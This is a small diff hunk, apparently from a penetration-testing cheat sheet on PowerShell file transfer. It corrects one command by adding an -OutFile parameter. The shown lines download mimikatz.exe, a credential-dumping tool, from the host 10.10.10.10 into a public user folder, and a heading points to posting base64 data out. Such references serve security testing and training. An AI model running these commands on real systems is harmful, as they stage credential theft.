@@ -15,7 +15,7 @@
 
 `Invoke-WebRequest "http://10.10.10.10/mimikatz.exe" -OutFile "C:\Users\Public\mimikatz.exe"`
 
-`Invoke-RestMethod "http://10.10.10.10/mimikatz.exe" "C:\Users\Public\mimikatz.exe"`
+`Invoke-RestMethod "http://10.10.10.10/mimikatz.exe" -OutFile "C:\Users\Public\mimikatz.exe"`
 
 
 ### Invoke-WebRequest / Invoke-RestMethod POST base64 data
